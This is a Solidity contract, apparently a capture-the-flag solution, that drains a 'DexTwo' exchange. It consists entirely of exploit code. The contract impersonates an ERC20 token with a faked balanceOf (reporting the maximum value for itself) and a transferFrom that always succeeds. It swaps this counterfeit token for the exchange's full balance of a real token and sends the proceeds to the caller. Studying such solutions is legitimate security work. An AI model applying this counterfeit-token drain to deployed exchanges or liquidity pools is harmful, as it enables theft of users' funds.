// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import { IDexTwo } from "./IDexTwo.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";


contract DexTwoSolution {

    address referenceToken;


    function drainIt(IDexTwo _dex, bool _isToken1) public {
        address inputToken = address(this);
        address outputToken = _isToken1 ? _dex.token1() : _dex.token2();
        referenceToken = outputToken;
        uint outputBalance = _dex.balanceOf(outputToken, address(_dex));

        _dex.swap(inputToken, outputToken, outputBalance);

        IERC20(outputToken).transfer(msg.sender, outputBalance);
    }

    function balanceOf(address _owner) public view returns (uint) {
        if(_owner == address(this)) {
            return type(uint256).max;
        } else {
            return IDexTwo(msg.sender).balanceOf(referenceToken, msg.sender);
        }
    }

    function transferFrom(address _from, address _to, uint _amount) public returns(bool){
        return true;
    }

    fallback() external {
    }


}
